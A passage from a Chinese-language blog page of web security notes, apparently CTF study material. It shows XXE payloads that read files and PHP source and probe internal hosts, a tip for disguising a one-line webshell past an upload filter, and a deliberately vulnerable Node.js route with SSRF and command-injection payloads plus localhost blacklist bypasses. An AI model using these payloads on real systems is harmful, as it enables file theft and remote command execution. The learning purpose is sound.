</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>ResultSet</span><span class=w> </span><span class=nf>execute</span><span class=p>(</span><span class=n>Connection</span><span class=w> </span><span class=n>connection</span><span class=p>,</span><span class=w> </span><span class=n>PreparedStatement</span><span class=w> </span><span class=n>preparedStatement</span><span class=p>,</span><span class=w> </span><span class=n>ResultSet</span><span class=w> </span><span class=n>resultSet</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sql</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>params</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>SQLException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 获取预编译的SQL语句</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>preparedStatement</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>connection</span><span class=p>.</span><span class=na>prepareStatement</span><span class=p>(</span><span class=n>sql</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 将占位符 ? 赋值</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>params</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>preparedStatement</span><span class=p>.</span><span class=na>setObject</span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>params</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>// 执行查询</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>resultSet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>preparedStatement</span><span class=p>.</span><span class=na>executeQuery</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>resultSet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span></span></span></code></pre></div></div><p>使用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-java"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>sql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;SELECT * FROM users WHERE username = ? AND age = ?&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>params</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=s>&#34;Alice&#34;</span><span class=p>,</span><span class=w> </span><span class=n>25</span><span class=w> </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ResultSet</span><span class=w> </span><span class=n>resultSet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>execute</span><span class=p>(</span><span class=n>connection</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>sql</span><span class=p>,</span><span class=w> </span><span class=n>params</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=反序列化漏洞-2>反序列化漏洞</h3><h2 id=js>JS</h2><h3 id=文件上传>文件上传</h3><p><strong>前端js过滤绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-javascript"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>file</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s1>&#39;upload_file&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>].</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>allow_ext</span> <span class=o>=</span> <span class=s2>&#34;.jpg|.png|.gif&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>ext_name</span> <span class=o>=</span> <span class=nx>file</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nx>file</span><span class=p>.</span><span class=nx>lastIndexOf</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>));</span> <span class=c1>// 上传文件类型
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>allow_ext</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>ext_name</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>errMsg</span> <span class=o>=</span> <span class=s2>&#34;NO&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=nx>errMsg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>一句话木马命名后缀为jpg，后借助burpsuite拦截请求将名称改回</p><h3 id=xxe注入漏洞>XXE注入漏洞</h3><ul><li>XML用于数据传输</li></ul><p><strong>XML</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=c>&lt;!-- 一般实体 --&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY name &#34;content&#34;&gt;</span> <span class=c>&lt;!-- 声明 --&gt;</span>
</span></span><span class=line><span class=cl><span class=err>&amp;</span>name <span class=c>&lt;!-- 引用 --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- 参数实体 --&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % name &#34;content&#34;&gt;</span> <span class=c>&lt;!-- 声明 --&gt;</span>
</span></span><span class=line><span class=cl><span class=err>&amp;</span>name <span class=c>&lt;!-- 引用 --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- 内部实体 --&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [&lt;!ENTITY f &#34;upfine&#34;&gt;</span>]&gt; <span class=c>&lt;!-- 声明 --&gt;</span>
</span></span><span class=line><span class=cl><span class=err>&amp;</span>f <span class=c>&lt;!-- 引用 --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- 外部实体 --&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [&lt;!ENTITY f SYSTEM &#34;file:///flag&#34;&gt;</span>]&gt; <span class=c>&lt;!-- 声明 --&gt;</span>
</span></span><span class=line><span class=cl><span class=err>&amp;</span>f <span class=c>&lt;!-- 引用 --&gt;</span></span></span></code></pre></div></div><ul><li>DTD：用于XML文档格式规范，可内部外部引入<code>&lt;!DOCTYPE ...</code></li><li>外部实体支持协议：<code>php(file, php, http, ftp), java(http, ftp, https)</code></li><li>XML外部实体注入，XML External Entity Injection，解析XML输入未禁止外部实体加载</li></ul><p>抓包POST数据以XML形式传输</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;user&gt;&lt;username&gt;</span>input_thing<span class=nt>&lt;/username&gt;&lt;/user&gt;</span></span></span></code></pre></div></div><p><strong>注入</strong></p><ul><li>声明XML文档版本及编码，可选</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding = &#34;utf-8&#34;?&gt;</span> 
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY file SYSTEM  &#34;file:///flag&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;</span>
</span></span><span class=line><span class=cl>	<span class=nt>&lt;username&gt;</span><span class=ni>&amp;file;</span><span class=nt>&lt;/username&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/user&gt;</span></span></span></code></pre></div></div><p><strong>使用协议获取源码</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/xxx.php&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- 获取内容base64解码 --&gt;</span></span></span></code></pre></div></div><p><strong>探测内网</strong></p><ul><li>可通过<code>/proc/net/fib_trie, /proc/net/arp, /etc/hosts</code>获取可疑内网IP</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-xml"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY file SYSTEM &#34;http://x.x.x.x/&#34;&gt;</span> <span class=c>&lt;!-- 通过此访问内网主机数据 --&gt;</span></span></span></code></pre></div></div><h2 id=nodejs>Node.js</h2><h3 id=基础知识-2>基础知识</h3><h3 id=ssrf漏洞-1>SSRF漏洞</h3><h4 id=漏洞点-1>漏洞点</h4><ul><li>设置服务器端口</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-js"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>port</span> <span class=o>=</span> <span class=nx>normalizePort</span><span class=p>(</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>PORT</span> <span class=o>||</span> <span class=s1>&#39;3000&#39;</span><span class=p>);</span></span></span></code></pre></div></div><ul><li>此处通过post传入payload再通过get本地服务器访问达成SSRF利用</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-js"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// routes/index.js
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>blacklist</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;::ffff:127.0.0.1&#39;</span><span class=p>,</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>,</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=s1>&#39;[::1]&#39;</span><span class=p>,</span><span class=s1>&#39;::1&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// req中ip:客户端IP地址, url:请求URL, query:GET查询参数, body:POST请求体数据
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/debug&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// 请求对象, 响应对象, 下一步中间件
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nx>blacklist</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>ip</span><span class=p>)</span><span class=o>!=-</span><span class=mi>1</span><span class=p>){</span> <span class=c1>// 黑名单过滤
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>u</span><span class=o>=</span><span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>url</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[\&#34;\&#39;]/ig</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>);</span> <span class=c1>// 清除请求url的单双引号
</span></span></span><span class=line><span class=cl><span class=c1></span>        
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>log</span><span class=o>=</span><span class=sb>`echo &#39;</span><span class=si>${</span><span class=nx>url</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>u</span><span class=p>).</span><span class=nx>href</span><span class=si>}</span><span class=sb>&#39;&gt;&gt;/tmp/log`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>child_process</span><span class=p>.</span><span class=nx>exec</span><span class=p>(</span><span class=nx>log</span><span class=p>);</span> <span class=c1>// 执行命令
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span><span class=nx>data</span><span class=o>:</span><span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;/tmp/log&#39;</span><span class=p>).</span><span class=nx>toString</span><span class=p>()});</span> <span class=c1>// 读取内容返回
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/debug&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>url</span> <span class=o>!==</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>u</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>url</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>urlObject</span><span class=o>=</span><span class=nx>url</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>u</span><span class=p>);</span> <span class=c1>// 解析返回json对象
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nx>blacklist</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>urlObject</span><span class=p>.</span><span class=nx>hostname</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>dest</span><span class=o>=</span><span class=nx>urlObject</span><span class=p>.</span><span class=nx>href</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>request</span><span class=p>(</span><span class=nx>dest</span><span class=p>,(</span><span class=nx>err</span><span class=p>,</span><span class=nx>result</span><span class=p>,</span><span class=nx>body</span><span class=p>)=&gt;{</span>
</span></span><span class=line><span class=cl>                <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span><span class=nx>body</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>([]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span></span></span></code></pre></div></div><p><strong>构造payload</strong></p><ul><li>进制转换绕过黑名单</li><li>闭合引号加入其余命令：利用nodejs的url库二次解码绕过<ul><li><code>@</code>字符前，即表示用户名密码字段，会被二次解码</li></ul></li><li><code>%00</code>或<code>%23</code>截断后续代码</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 二次编码 =&gt; web服务器一次解码 http://a%27@a, nodejs二次解码 http://a&#39;@a</span>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;url&#34;</span>:<span class=s2>&#34;http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp</span><span class=nv>$IFS</span><span class=s2>/flag</span><span class=nv>$IFS</span><span class=s2>/tmp/log%00&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 特殊编码 =&gt; %EF%BC%87解码为&#39;</span>
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;url&#34;</span>:<span class=s2>&#34;http://127.1:3000/debug?url=http://%EF%BC%87;cp</span><span class=nv>$IFS</span><span class=s2>/flag</span><span class=nv>$IFS</span><span class=s2>/tmp/log%00&#34;</span><span class=o>}</span></span></span></code></pre></div></div><p>使用POSTMAN，<code>POST -> body -> x-www-form-urlencoded</code></p><h4 id=绕过-2>绕过</h4><p><strong>SSRF黑名单绕过</strong></p><ul><li><code>http://localhost</code></li><li><code>http://[::]:80/</code></li><li>进制转换<code>http://0177.0.0.1/</code>或<code>http://2130706433/</code></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2025-05-28&nbsp;<a class=git-hash href=https://github.com/dillonzq/LoveIt/commit/bd8e4116cdee578e855df9d33c27c0b3c4919951 target=_blank title="commit by J-shiro(541737231@qq.com) bd8e4116cdee578e855df9d33c27c0b3c4919951: fix ** and add cv note">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>bd8e411</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/web_note/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://j-shiro.github.io/web_note/ data-hashtag=web><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://j-shiro.github.io/web_note/ data-title=WEB><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@14.9.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://j-shiro.github.io/web_note/ data-title=WEB><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fj-shiro.github.io%2fweb_note%2f&amp;text=WEB" target=_blank title="分享到 Telegram"><i class="fab fa-telegram fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/web/>Web</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/search/ class=prev rel=prev title=搜索><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>搜索</a>
<a href=/reverse_note/ class=next rel=next title=REVERSE>REVERSE<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.143.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>jshiro</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i></a></div><div id=fixed-buttons-hidden><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css><script src=https://cdn.jsdelivr.net/npm/valine@1.5.3/dist/Valine.min.js></script><script src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script src=https://cdn.jsdelivr.net/npm/algoliasearch@5.20.2/dist/lite/builds/browser.umd.min.js></script><script src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js></script><script src=https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js></script><script>window.config={comment:{valine:{appId:"wAgpK3Sa13Vfm247ncxiGVDA-MdYXbMMI",appKey:"p6X9gNaJTGB1sqgG9ZnrEwy4",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph